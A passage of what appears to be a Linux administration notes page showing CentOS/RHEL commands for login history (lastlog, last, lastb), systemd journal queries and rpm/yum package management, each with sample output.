<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> stat hashes.txt
</span><span class='line'>   File: hashes.txt
</span><span class='line'>   Size: 43           Blocks: 8          IO Block: 4096   regular file
</span><span class='line'> Device: fd00h/64768d Inode: 33859054    Links: 1
</span><span class='line'> Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
</span><span class='line'> Context: unconfined_u:object_r:admin_home_t:s0
</span><span class='line'> Access: 2017-09-26 11:27:18.298105601 +0300
</span><span class='line'> Modify: 2017-09-22 14:14:29.035069557 +0300
</span><span class='line'> Change: 2017-09-22 14:14:29.035069557 +0300
</span><span class='line'>  Birth: -</span></code></pre></td></tr></table></div></figure>


<h4>lastlog</h4>

<blockquote><p>reports the most recent login of all users or of a given user</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> lastlog
</span><span class='line'> Username         Port     From             Latest
</span><span class='line'> root             :0                        Sat Oct  7 14:45:28 +0300 2017
</span><span class='line'> bin                                        **Never logged in**
</span><span class='line'> daemon                                     **Never logged in**
</span><span class='line'> adm                                        **Never logged in**
</span><span class='line'> lp                                         **Never logged in**
</span><span class='line'> sync                                       **Never logged in**
</span><span class='line'> shutdown                                   **Never logged in**
</span><span class='line'> halt                                       **Never logged in**
</span><span class='line'> mail                                       **Never logged in**
</span><span class='line'> operator                                   **Never logged in**
</span><span class='line'> games                                      **Never logged in**
</span><span class='line'> ftp                                        **Never logged in**
</span><span class='line'> nobody                                     **Never logged in**
</span><span class='line'> systemd-bus-proxy                           **Never logged in**
</span><span class='line'> systemd-network                            **Never logged in**
</span><span class='line'> dbus                                       **Never logged in**
</span><span class='line'> polkitd                                    **Never logged in**
</span><span class='line'> abrt                                       **Never logged in**
</span><span class='line'> unbound                                    **Never logged in**
</span><span class='line'> tss                                        **Never logged in**
</span><span class='line'> colord                                     **Never logged in**
</span><span class='line'> usbmuxd                                    **Never logged in**
</span><span class='line'> geoclue                                    **Never logged in**
</span><span class='line'> saslauth                                   **Never logged in**
</span><span class='line'> libstoragemgmt                             **Never logged in**
</span><span class='line'> rpc                                        **Never logged in**
</span><span class='line'> rtkit                                      **Never logged in**
</span><span class='line'> chrony                                     **Never logged in**
</span><span class='line'> radvd                                      **Never logged in**
</span><span class='line'> qemu                                       **Never logged in**
</span><span class='line'> ntp                                        **Never logged in**
</span><span class='line'> rpcuser                                    **Never logged in**
</span><span class='line'> nfsnobody                                  **Never logged in**
</span><span class='line'> avahi-autoipd                              **Never logged in**
</span><span class='line'> setroubleshoot                             **Never logged in**
</span><span class='line'> sssd                                       **Never logged in**
</span><span class='line'> pulse                                      **Never logged in**
</span><span class='line'> gdm              :0                        Sat Oct  7 14:42:55 +0300 2017
</span><span class='line'> gnome-initial-setup :0                        Tue Apr 26 15:36:08 +0300 2016
</span><span class='line'> sshd                                       **Never logged in**
</span><span class='line'> avahi                                      **Never logged in**
</span><span class='line'> postfix                                    **Never logged in**
</span><span class='line'> tcpdump                                    **Never logged in**
</span><span class='line'> nixhat           :0                        Sat Aug 19 20:00:48 +0300 2017
</span><span class='line'> apache                                     **Never logged in**
</span><span class='line'> smbuser                                    **Never logged in**
</span><span class='line'> squid                                      **Never logged in**</span></code></pre></td></tr></table></div></figure>


<ul>
<li>see last time a user logged in</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> lastlog -u root
</span><span class='line'> Username         Port     From             Latest
</span><span class='line'> root             :0                        Sat Oct  7 14:45:28 +0300 2017</span></code></pre></td></tr></table></div></figure>


<h4>last</h4>

<blockquote><p>show listing of last logged in users</p>

<p>Last searches back through the file /var/log/wtmp (or the  file  designated  by  the
f flag) and displays a list of all users logged in (and out) since that file was
created.</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> last -n 10
</span><span class='line'> root     pts/1        :0               Sat Oct  7 14:53   still logged in   
</span><span class='line'> root     pts/0        :0               Sat Oct  7 14:45   still logged in   
</span><span class='line'> root     :0           :0               Sat Oct  7 14:45   still logged in   
</span><span class='line'> (unknown :0           :0               Sat Oct  7 14:42 - 14:45  (00:02)    
</span><span class='line'> reboot   system boot  3.10.0-514.21.1. Sat Oct  7 14:41 - 14:54  (00:13)    
</span><span class='line'> root     pts/1        :0               Fri Oct  6 21:48 - 23:19  (01:30)    
</span><span class='line'> root     pts/0        :0               Fri Oct  6 21:47 - 23:19  (01:32)    
</span><span class='line'> root     :0           :0               Fri Oct  6 21:43 - 23:19  (01:36)    
</span><span class='line'> (unknown :0           :0               Fri Oct  6 21:37 - 21:43  (00:05)    
</span><span class='line'> reboot   system boot  3.10.0-514.21.1. Fri Oct  6 21:36 - 23:19  (01:43)    
</span><span class='line'> 
</span><span class='line'> wtmp begins Tue Apr 26 15:32:43 2016</span></code></pre></td></tr></table></div></figure>


<h4>lastb</h4>

<blockquote><p>shows a log of the file /var/log/btmp, which contains all the bad login attempts</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> lastb
</span><span class='line'> root     :0           :0               Sat Oct  7 14:57 - 14:57  (00:00)    
</span><span class='line'> root     :0           :0               Sat Oct  7 14:57 - 14:57  (00:00)    
</span><span class='line'> nixhat   :0           :0               Sat Oct  7 14:57 - 14:57  (00:00)    
</span><span class='line'> 
</span><span class='line'> btmp begins Sat Oct  7 14:57:26 2017</span></code></pre></td></tr></table></div></figure>


<h4>logrotate</h4>

<blockquote><p>rotates, compresses, and mails system logs</p></blockquote>

<p> Config file: <strong>/etc/logrotate.conf</strong></p>

<h4>journalctl</h4>

<blockquote><p>Query the systemd journal</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> journalctl -u httpd.service
</span><span class='line'> -- Logs begin at Sat 2017-10-07 14:41:21 EEST, end at Sat 2017-10-07 15:34:36 EE
</span><span class='line'> Oct 07 14:42:14 localhost.localdomain systemd[1]: Starting The Apache HTTP Serve
</span><span class='line'> Oct 07 14:42:23 localhost.localdomain httpd[1099]: AH00558: httpd: Could not rel
</span><span class='line'> Oct 07 14:42:24 localhost.localdomain systemd[1]: Started The Apache HTTP Server
</span><span class='line'> Oct 07 15:11:02 localhost.localdomain httpd[6068]: AH00558: httpd: Could not rel
</span><span class='line'> Oct 07 15:11:02 localhost.localdomain systemd[1]: Reloaded The Apache HTTP Serve</span></code></pre></td></tr></table></div></figure>


<ul>
<li>show boot log</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> journalctl -b | tail
</span><span class='line'> Jan 25 18:28:01 rhel7 systemd[1]: Created slice user-993.slice.
</span><span class='line'> Jan 25 18:28:01 rhel7 systemd[1]: Starting user-993.slice.
</span><span class='line'> Jan 25 18:28:01 rhel7 systemd[1]: Started Session 45 of user pcp.
</span><span class='line'> Jan 25 18:28:01 rhel7 systemd[1]: Starting Session 45 of user pcp.
</span><span class='line'> Jan 25 18:28:01 rhel7 CROND[6820]: (pcp) CMD ( /usr/libexec/pcp/bin/pmie_check -C)
</span><span class='line'> Jan 25 18:28:01 rhel7 systemd[1]: Removed slice user-993.slice.
</span><span class='line'> Jan 25 18:28:01 rhel7 systemd[1]: Stopping user-993.slice.
</span><span class='line'> Jan 25 18:30:01 rhel7 systemd[1]: Started Session 46 of user root.
</span><span class='line'> Jan 25 18:30:01 rhel7 systemd[1]: Starting Session 46 of user root.
</span><span class='line'> Jan 25 18:30:01 rhel7 CROND[6978]: (root) CMD (/usr/lib64/sa/sa1 1 1)</span></code></pre></td></tr></table></div></figure>


<ul>
<li>show error events</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> journalctl -p err
</span><span class='line'> -- Logs begin at Thu 2018-01-25 14:28:07 EET, end at Thu 2018-01-25 18:30:01 EET. --
</span><span class='line'> Jan 25 14:28:10 rhel7 kernel: piix4_smbus 0000:00:07.3: Host SMBus controller not enabled!
</span><span class='line'> Jan 25 14:28:11 rhel7 kernel: intel_rapl: no valid rapl domains found in package 0
</span><span class='line'> Jan 25 14:28:35 rhel7 cntlm[1121]: Error creating a new PID file
</span><span class='line'> Jan 25 14:28:45 rhel7 spice-vdagent[2501]: Cannot access vdagent virtio channel /dev/virtio-ports/com.redhat.spice.0
</span><span class='line'> Jan 25 14:28:57 rhel7 udisksd[2652]: Error probing device: Error sending ATA command IDENTIFY PACKET DEVICE to /dev/sr0: ATA command failed: error=0x01 count=0x02 status=0x5
</span><span class='line'> Jan 25 14:47:48 rhel7 gdm-launch-environment][2380]: pam_systemd(gdm-launch-environment:session): Failed to release session: Interrupted system call
</span><span class='line'> Jan 25 14:47:50 rhel7 spice-vdagent[3306]: Cannot access vdagent virtio channel /dev/virtio-ports/com.redhat.spice.0
</span><span class='line'> Jan 25 14:48:15 rhel7 pulseaudio[3318]: GetManagedObjects() failed: org.freedesktop.DBus.Error.NoReply: Did not receive a reply. Possible causes include: the remote applicat
</span><span class='line'> Jan 25 14:53:38 rhel7 kernel: ata4: exception Emask 0x10 SAct 0x0 SErr 0x4010000 action 0xe frozen
</span><span class='line'> Jan 25 14:53:38 rhel7 kernel: ata4: irq_stat 0x00400040, connection status changed
</span><span class='line'> Jan 25 14:53:38 rhel7 kernel: ata4: SError: { PHYRdyChg DevExch }</span></code></pre></td></tr></table></div></figure>


<h4>rpm</h4>

<blockquote><p>RPM Package Manager</p></blockquote>

<ul>
<li>count all installed packages</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rpqm -qa | wc -l
</span><span class='line'>1366</span></code></pre></td></tr></table></div></figure>


<ul>
<li>get info about installed package</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> rpm -qi samba
</span><span class='line'> Name        : samba
</span><span class='line'> Epoch       : 0
</span><span class='line'> Version     : 4.4.4
</span><span class='line'> Release     : 14.el7_3
</span><span class='line'> Architecture: x86_64
</span><span class='line'> Install Date: Thu 08 Jun 2017 10:55:00 AM EEST
</span><span class='line'> Group       : System Environment/Daemons
</span><span class='line'> Size        : 1869228
</span><span class='line'> License     : GPLv3+ and LGPLv3+
</span><span class='line'> Signature   : RSA/SHA256, Thu 25 May 2017 04:16:22 PM EEST, Key ID 24c6a8a7f4a80eb5
</span><span class='line'> Source RPM  : samba-4.4.4-14.el7_3.src.rpm
</span><span class='line'> Build Date  : Thu 25 May 2017 02:35:40 PM EEST
</span><span class='line'> Build Host  : c1bm.rdu2.centos.org
</span><span class='line'> Relocations : (not relocatable)
</span><span class='line'> Packager    : CentOS BuildSystem &lt;http://bugs.centos.org&gt;
</span><span class='line'> Vendor      : CentOS
</span><span class='line'> URL         : http://www.samba.org/
</span><span class='line'> Summary     : Server and Client software to interoperate with Windows machines
</span><span class='line'> Description :
</span><span class='line'> Samba is the standard Windows interoperability suite of programs for Linux and
</span><span class='line'> Unix.</span></code></pre></td></tr></table></div></figure>


<ul>
<li>list files in package</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> rpm -ql lynx
</span><span class='line'> /etc/lynx-site.cfg
</span><span class='line'> /etc/lynx.cfg
</span><span class='line'> /etc/lynx.lss
</span><span class='line'> /usr/bin/lynx
</span><span class='line'> /usr/share/doc/lynx-2.8.8
</span><span class='line'> [...]
</span><span class='line'> /usr/share/locale/zh_TW/LC_MESSAGES/lynx.mo
</span><span class='line'> /usr/share/man/man1/lynx.1.gz</span></code></pre></td></tr></table></div></figure>


<ul>
<li>list config files</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> rpm -qc name</span></code></pre></td></tr></table></div></figure>


<ul>
<li>install RPM package</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> rpm -i pkgname</span></code></pre></td></tr></table></div></figure>


<ul>
<li>upgrade package</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> rpm -U pkgname</span></code></pre></td></tr></table></div></figure>


<ul>
<li>remove package</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> rpm -e pkgname</span></code></pre></td></tr></table></div></figure>


<ul>
<li>see where file comes from</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> rpm -qf /etc/httpd/conf
</span><span class='line'> httpd-2.4.6-45.el7.centos.4.x86_64</span></code></pre></td></tr></table></div></figure>


<ul>
<li>verify package</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rpm -V pgkname</span></code></pre></td></tr></table></div></figure>


<ul>
<li>list documentation files</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rpm -qd cmdname</span></code></pre></td></tr></table></div></figure>


<h4>yum</h4>

<blockquote><p>Yellowdog Updater Modified</p></blockquote>

<ul>
<li>install automatically</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> yum install -y pkgname</span></code></pre></td></tr></table></div></figure>


<ul>
<li>get info about package</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> yum info nmap
</span><span class='line'> [...]
</span><span class='line'> Available Packages
</span><span class='line'> Name        : nmap
</span><span class='line'> Arch        : x86_64
</span><span class='line'> Epoch       : 2
</span><span class='line'> Version     : 6.40
</span><span class='line'> Release     : 7.el7
</span><span class='line'> Size        : 4.0 M
</span><span class='line'> Repo        : base/7/x86_64
</span><span class='line'> Summary     : Network exploration tool and security scanner
</span><span class='line'> URL         : http://nmap.org/
</span><span class='line'> License     : GPLv2 and LGPLv2+ and GPLv2+ and BSD
</span><span class='line'> Description : Nmap is a utility for network exploration or security auditing.
</span><span class='line'>             : It supports ping scanning (determine which hosts are up), many
</span><span class='line'>             : port scanning techniques (determine what services the hosts are
</span><span class='line'>             : offering), and TCP/IP fingerprinting (remote host operating system
</span><span class='line'>             : identification). Nmap also offers flexible target and port
</span><span class='line'>             : specification, decoy scanning, determination of TCP sequence
</span><span class='line'>             : predictability characteristics, reverse-identd scanning, and more.
</span><span class='line'>             : In addition to the classic command-line nmap executable, the Nmap
</span><span class='line'>             : suite includes a flexible data transfer, redirection, and
</span><span class='line'>             : debugging tool (netcat utility ncat), a utility for comparing scan
</span><span class='line'>             : results (ndiff), and a packet generation and response analysis
</span><span class='line'>             : tool (nping).</span></code></pre></td></tr></table></div></figure>


<ul>
<li>remove pkg</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> yum remove pkgname</span></code></pre></td></tr></table></div></figure>


<ul>
<li>list dependencies</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> yum deplist cowsay
</span><span class='line'> [...]
</span><span class='line'> package: cowsay.noarch 3.04-4.el7
</span><span class='line'>   dependency: /bin/sh
</span><span class='line'>    provider: bash.x86_64 4.2.46-29.el7_4
</span><span class='line'>   dependency: /usr/bin/perl
</span><span class='line'>    provider: perl.x86_64 4:5.16.3-292.el7
</span><span class='line'>   dependency: perl(Cwd)
</span><span class='line'>    provider: perl-PathTools.x86_64 3.40-5.el7
</span><span class='line'>   dependency: perl(File::Basename)
</span><span class='line'>    provider: perl.x86_64 4:5.16.3-292.el7
</span><span class='line'>   dependency: perl(Getopt::Std)
</span><span class='line'>    provider: perl.x86_64 4:5.16.3-292.el7
</span><span class='line'>   dependency: perl(Text::Tabs)
</span><span class='line'>    provider: perl.x86_64 4:5.16.3-292.el7
</span><span class='line'>   dependency: perl(Text::Wrap)
</span><span class='line'>    provider: perl.x86_64 4:5.16.3-292.el7
</span><span class='line'>   dependency: perl(strict)
</span><span class='line'>    provider: perl.x86_64 4:5.16.3-292.el7
</span><span class='line'>   dependency: perl-Encode
</span><span class='line'>    provider: perl-Encode.x86_64 2.51-7.el7</span></code></pre></td></tr></table></div></figure>


<ul>
<li>list installed packages</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> yum list installed
</span><span class='line'> [...]
</span><span class='line'> yum.noarch                             3.4.3-150.el7.centos            @base    
</span><span class='line'> yum-langpacks.noarch                   0.4.2-7.el7                     @base    
</span><span class='line'> yum-metadata-parser.x86_64             1.1.4-10.el7                    @anaconda
</span><span class='line'> yum-plugin-fastestmirror.noarch        1.1.31-40.el7                   @base    
</span><span class='line'> yum-utils.noarch                       1.1.31-40.el7                   @base    
</span><span class='line'> zenity.x86_64                          3.8.0-5.el7                     @anaconda
</span><span class='line'> zip.x86_64                             3.0-11.el7                      @base    
</span><span class='line'> zlib.x86_64                            1.2.7-17.el7                    @base    </span></code></pre></td></tr></table></div></figure>


<ul>
<li>update all packages</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> yum update</span></code></pre></td></tr></table></div></figure>


<ul>
<li>check if updates are available, without updating</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> yum check-update</span></code></pre></td></tr></table></div></figure>


<ul>
<li>list info about available packages</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> yum list python
</span><span class='line'> [...]
</span><span class='line'> Installed Packages
</span><span class='line'> python.x86_64                         2.7.5-48.el7                         @base
</span><span class='line'> Available Packages
</span><span class='line'> python.x86_64                         2.7.5-58.el7                         base
</span><span class='line'> [root@localhost ~]#</span></code></pre></td></tr></table></div></figure>


<ul>
<li>find out which package provides some feature or file</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> yum provides scapy
</span><span class='line'> scapy-2.3.3-1.el7.noarch : Interactive packet manipulation tool and network
</span><span class='line'>                          : scanner
</span><span class='line'> Repo        : epel</span></code></pre></td></tr></table></div></figure>


<ul>
<li>find packages when you know something about  the package but aren&rsquo;t sure of its name.</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> yum search name</span></code></pre></td></tr></table></div></figure>


<ul>
<li>list package summary</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> yum info scapy
</span><span class='line'> Available Packages
</span><span class='line'> Name        : scapy
</span><span class='line'> Arch        : noarch
</span><span class='line'> Version     : 2.3.3
</span><span class='line'> Release     : 1.el7
</span><span class='line'> Size        : 983 k
</span><span class='line'> Repo        : epel/x86_64
</span><span class='line'> Summary     : Interactive packet manipulation tool and network scanner
</span><span class='line'> URL         : http://www.secdev.org/projects/scapy/
</span><span class='line'> License     : GPLv2
</span><span class='line'> Description : Scapy is a powerful interactive packet manipulation program built
</span><span class='line'>             : on top of the Python interpreter. It can be used to forge or
</span><span class='line'>             : decode packets of a wide number of protocols, send them over the
</span><span class='line'>             : wire, capture them, match requests and replies, and much more.</span></code></pre></td></tr></table></div></figure>


<ul>
<li>find which package provides an utility</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> yum provides sealert
</span><span class='line'> Loaded plugins: langpacks, product-id, search-disabled-repos, subscription-manager
</span><span class='line'> setroubleshoot-server-3.2.27.2-3.el7.x86_64 : SELinux troubleshoot server
</span><span class='line'> Repo        : rhel7-local
</span><span class='line'> Matched from:
</span><span class='line'> Filename    : /usr/bin/sealert</span></code></pre></td></tr></table></div></figure>


<ul>
<li>perform cleaning operations</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> yum clean
</span><span class='line'> all           dbcache       headers       packages      
</span><span class='line'> cache         expire-cache  metadata   </span></code></pre></td></tr></table></div></figure>


<ul>
<li>Produces a list of all dependencies and  what  packages  provide those  dependencies  for the given packages.</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>yum deplist scapy
</span><span class='line'> package: scapy.noarch 2.3.3-1.el7
</span><span class='line'>   dependency: /usr/bin/python
</span><span class='line'>    provider: python.x86_64 2.7.5-58.el7
</span><span class='line'>   dependency: python &gt;= 2.5
</span><span class='line'>    provider: python.x86_64 2.7.5-58.el7
</span><span class='line'>   dependency: python(abi) = 2.7
</span><span class='line'>    provider: python.x86_64 2.7.5-58.el7</span></code></pre></td></tr></table></div></figure>


<ul>
<li>list configured repositories</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> yum repolist
</span><span class='line'> repo id               repo name                                           status
</span><span class='line'> base/7/x86_64         CentOS-7 - Base                                      9,591
</span><span class='line'> *epel/x86_64          Extra Packages for Enterprise Linux 7 - x86_64      11,985
</span><span class='line'> extras/7/x86_64       CentOS-7 - Extras                                      227
</span><span class='line'> nux-dextop/x86_64     Nux.Ro RPMs for general desktop use                  1,599
</span><span class='line'> updates/7/x86_64      CentOS-7 - Updates                                     731
</span><span class='line'> repolist: 24,133</span></code></pre></td></tr></table></div></figure>


<ul>
